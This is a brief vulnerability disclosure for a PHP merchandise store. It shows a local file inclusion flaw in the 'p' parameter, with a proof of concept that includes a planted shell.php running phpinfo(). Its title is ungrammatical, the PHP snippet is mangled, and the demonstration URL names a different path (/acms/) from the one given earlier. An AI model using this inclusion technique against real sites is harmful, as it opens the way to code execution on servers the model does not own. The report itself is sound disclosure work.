# Merchandise Online Store v1.0 by oretnom23 has The local file contains

vendor : https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: ip/vloggers_merch/?p=

Vulnerability location: ip/vloggers_merch/?p=, p

Payload: ip/vloggers_merch/?p=shell

![image](https://user-images.githubusercontent.com/54017627/166878620-1da1f581-2df1-4970-bb30-eb37e7d55c63.png)

We create a shell.php under the PHP file of the root of the website, which reads "<?" phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/166878725-ca72883d-4400-414d-baf9-421238f3b873.png)

And visit http://ip/acms/?p=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/166878691-cdc9a38f-a23c-43f8-9b94-83a64f66ed6e.png)
